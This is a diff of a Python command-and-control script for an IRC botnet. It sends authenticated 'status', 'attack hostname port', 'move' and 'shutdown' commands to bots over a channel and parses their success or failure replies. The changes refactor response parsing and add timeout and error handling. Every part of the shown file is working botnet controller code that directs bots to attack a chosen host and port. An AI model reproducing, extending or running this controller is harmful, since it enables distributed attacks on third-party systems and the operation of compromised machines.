@@ -17,87 +17,99 @@ nick = "controller"
 atk_cnt = 0
 active = True
 
-#send a command to the bots
-def send_command(msg):
-	send("PRIVMSG " + channel + " :" + msg + " " + nick + " " + secret_phrase + "\n")
-	return
+
+def list_names(names):
+	for name in names:
+		print(name)
+		
+def list_statuses(names, status):
+	i = 0
+	while i < len(names):
+		print(names[i] + ": " + status)
+		i +=1
+
+'''
+------------------------------------------------------------------------
+                             Commands 
+------------------------------------------------------------------------
+'''
 
 
-
-#ids bots and prints out numbers
+#runs status command on bots, prints result
 def cmd_status():
 	send_command("status")
-	##gets replieds back from irc
-	msg = ""
-	while msg == "":
-		time.sleep(1)
-		msg = rcv_irc_response()
-		msg = msg.strip()
+	msg = rcv_irc_response()
 	bot_names = []
-	msgs = msg.split("\n")
-	for m in msgs:
-		bot_names.append((m[m.find(':', 1)+1:] + "\n").strip())
-		
+	if msg == ERROR_FLAG:
+		pass
+	else:
+		#extract individual responses
+		msg = msg.strip()
+		msgs = msg.split("\n")
+		for m in msgs:
+			if m.startswith(":V"):
+				bot_names.append((m[m.find(':', 1)+1:] + "\n").strip())
+	#print returned info
 	print("num of bots: " + str(len(bot_names)))
-	print(str(bot_names))
-	#except somerror:
-		#con_active = False
+	list_names(bot_names)
+	return
 	
 	
 #tells the bots to attack the hostname
 def cmd_attack(hostname, port):
 	send_command("attack "+ hostname + " " + port)
-	#bots send a message back to controller telling if success or not  
-	msg = ""
-	while msg == "":
-		time.sleep(1)
-		msg = rcv_irc_response()
-		msg = msg.strip()
+	msg = rcv_irc_response()
 	successes = []
 	failures = []
-	msgs = msg.split("\n")
-	for m in msgs:
-		bot_status = (m[m.find(':', 1)+1:] + "\n").strip()
-		bot_status = bot_status.split()
-		bot = bot_status[0]
-		status = bot_status[1]
-		if status == "success":
-			successes.append(bot)
-		elif status == "failure":
-			failures.append(bot)
+	if msg == ERROR_FLAG:
+		pass
+	else:
+		#extract individual responses
+		msg = msg.strip()
+		msgs = msg.split("\n")
+		for m in msgs:
+			bot_status = (m[m.find(':', 1)+1:] + "\n").strip()
+			bot_status = bot_status.split()
+			if len(bot_status) == 2: 
+				bot = bot_status[0]
+				status = bot_status[1]
+				if status == "success":
+					successes.append(bot)
+				elif status == "failure":
+					failures.append(bot)
 	print("Successful attack bots: " + str(len(successes)))
-	print(str(successes))
+	list_statuses(successes, "attack success")
 	print("Failed attacking bots: " + str(len(failures)))
-	print(str(failures))
+	list_statuses(failures, "attack failure")
 	return
 
 
 #move bots from current irc to new irc
 def cmd_move(hostname, port, chan):
-	#instructs bots to disconnect from current irc and move to another one
 	send_command("move "+ hostname + " " + port + " " + chan)
-	#bots send a message back to controller telling if success or not  
-	msg = ""
-	while msg == "":
-		time.sleep(1)
-		msg = rcv_irc_response()
-		msg = msg.strip()
+	msg = rcv_irc_response()
 	successes = []
 	failures = []
-	msgs = msg.split("\n")
-	for m in msgs:
-		bot_status = (m[m.find(':', 1)+1:] + "\n").strip()
-		bot_status = bot_status.split()
-		bot = bot_status[0]
-		status = bot_status[1]
-		if status == "success":
-			successes.append(bot)
-		elif status == "failure":
-			failures.append(bot)
+	if msg == ERROR_FLAG:
+		pass
+	else:
+		#extract individual responses
+		msg = msg.strip()
+		msgs = msg.split("\n")
+		for m in msgs:
+			bot_status = (m[m.find(':', 1)+1:] + "\n").strip()
+			bot_status = bot_status.split()
+			if len(bot_status) == 2: 
+				bot = bot_status[0]
+				status = bot_status[1]
+				if status == "success":
+					successes.append(bot)
+				elif status == "failure":
+					failures.append(bot)
 	print("Successfully moved bots: " + str(len(successes)))
-	print(str(successes))
+	list_statuses(successes, "attack success")
 	print("Failed moving bots: " + str(len(failures)))
-	print(str(failures))
+	list_statuses(failures, "attack failure")
 	return
 
 
@@ -108,70 +120,102 @@ def cmd_quit():
 	active = False	
 	return
 
+
 #this kills the bot(s)
 def cmd_shutdown():
 	send_command("shutdown")
 	msg = ""
 	bot_names = []
 	numbots = 0
-	while msg == "":
-		time.sleep(1)
-		msg = rcv_irc_response()
+	msg = rcv_irc_response()
+	if msg == ERROR_FLAG:
+		pass
+	else:
+		#extract individual responses
 		msg = msg.strip()
-	msgs = msg.split("\n")
-	for line in msgs:
-		bot_status = (line[line.find(':', 1)+1:] + "\n").strip()
-		bot_status = bot_status.split()
-		if bot_status[0] != "EOT": 
-			bot = bot_status[0]
-			status = bot_status[1]
-			if status == "shutdown":
-				bot_names.append(bot)
-				print(bot + ": shutting down... ")
+		msgs = msg.split("\n")
+		for line in msgs:
+			bot_status = (line[line.find(':', 1)+1:] + "\n").strip()
+			bot_status = bot_status.split()
+			if len(bot_status) == 2: 
+				bot = bot_status[0]
+				status = bot_status[1]
+				if status == "shutdown":
+					bot_names.append(bot)
+					print(bot + ": shutting down... ")
 	print("Total: "+str(len(bot_names))+" bots shut down")
 	return
 
-#wait for a user to send command to the irc needs error checking
-def get_command():
-	msg = input("command> ")
-	cmd = msg.split()
-	return cmd
+
+'''
+------------------------------------------------------------------------
+                             Communication w/ IRC
+------------------------------------------------------------------------
+'''	
 
 
-#send as bytes TO DO
+#send to irc as bytes
 def send(msg):
 	global con_active
-	irc.send(msg.encode('UTF-8'))
+	try:
+		irc.send(msg.encode('UTF-8', 'ignore'))
+	except socket.error:
+		con_active = False
 	return
 	
-#receive a command from the controller TO DO parsing needed and error checking
+	
+#receive responses from bots
 def rcv_irc_response():
-	#try:
-	msg = irc.recv(1024).decode()
-	if msg.find('PING') != -1:
-		send('PONG ' + msg.split()[1] + '\r\n')
-		return "Ping pong conflict"
-	else:		
-		return msg
+	while True:
+		try:
+			#receive responses
+			msg = irc.recv(1024).decode()
+			#passively handle PING PONG
+			if msg.find('PING') != -1:
+				send('PONG ' + msg.split()[1] + '\r\n')
+			else:		
+				break
+		#if timeout, return error else return error and signify connection dead
+		except socket.error as err:
+			if err == socket.timeout:
+				pass
+			else:
+				con_active = False
+			return ERROR_FLAG
+	return msg
+		
 
+#send a command to the bots
+def send_command(msg):
+	send("PRIVMSG " + channel + " :" + msg + " " + nick + " " + secret_phrase + "\n")
+	time.sleep(3)
+	return
+	
 
 #connect to the specified IRC server and channel
 def connect(host, port):
 	global nick, irc, con_active
 	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	irc.settimeout(1)
 	try:
 		irc.connect((host,port))
 		con_active = True
 		print("connection made")
-	except ConnectionRefusedError:
+	except socket.error:
 		print("Error: Could not make connection")
 		return ERROR_FLAG
 		
 	send("USER " + nick + " " + nick + " " + nick + ": This controller is connecting\n") 
 	send("NICK " + nick + "\n")
 	send("JOIN " + channel + "\n")
-	
 	return 
+
+
+'''
+------------------------------------------------------------------------
+                             Communication loop
+------------------------------------------------------------------------
+'''
 
 
 #handle the connection to the IRC server
@@ -182,13 +226,9 @@ def handle_connection():
 		for s in readable:
 			##check the type
 			#if s std do cmds
-			
 			if s == sys.stdin:
-				#wait for commands
 				msg = sys.stdin.readline()
 				cmd = msg.split()
-						
-				#interpret command
 				if msg == "\n":
 					pass
 				elif cmd[0] == 'status':	
@@ -213,12 +253,22 @@ def handle_connection():
 				else:
 					print("Error: Unrecognized command received '" + ' '.join(cmd) + "'")
 				print('command> ', end = '', flush=True)
+			#else deal with Ping Pong
 			elif s == irc:			
 				msg = irc.recv(1024).decode()
-				send('PONG ' + msg.split()[1] + '\r\n')
-		
-
+				if msg.find('PING') != -1:
+					send('PONG ' + msg.split()[1] + '\r\n')
+			if con_active == False:
+					break
 	return
+	
+
+'''
+------------------------------------------------------------------------
+                             Program loop
+------------------------------------------------------------------------
+'''
+
 
 #main
 def main():
@@ -259,7 +309,14 @@ def main():
 			time.sleep(5)
 		else:
 			break
-
 	return
+
+
+'''
+------------------------------------------------------------------------
+                             Call Program
+------------------------------------------------------------------------
+'''
+
 
 main()
